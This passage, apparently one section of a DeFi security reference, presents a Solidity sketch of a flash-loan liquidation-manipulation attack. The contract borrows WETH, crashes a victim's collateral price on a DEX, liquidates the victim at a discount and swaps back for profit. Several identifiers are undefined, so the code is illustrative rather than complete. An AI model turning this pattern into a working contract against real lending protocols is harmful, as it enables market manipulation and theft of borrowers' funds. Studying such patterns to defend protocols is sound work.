## 4. Liquidation Manipulation

```solidity
// Flash loan to manipulate liquidation
contract LiquidationAttack {
    function attack(address victim, ILending lending, IOracle oracle) external {
        // 1. Flash loan massive amount
        uint256 amount = flashLoan.maxFlashLoan(WETH);
        flashLoan.flashLoan(this, WETH, amount, abi.encode(victim, lending));
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        (address victim, ILending lending) = abi.decode(data, (address, ILending));
        
        // 2. Swap to crash collateral price
        WETH.approve(address(dex), amount);
        dex.swap(WETH, VICTIM_COLLATERAL, amount);
        
        // 3. Liquidate victim at crashed price
        lending.liquidate(victim);  // Get collateral at discount
        
        // 4. Swap back at profit
        VICTIM_COLLATERAL.approve(address(dex), collateralReceived);
        dex.swap(VICTIM_COLLATERAL, WETH, collateralReceived);
        
        // 5. Repay flash loan
        WETH.approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

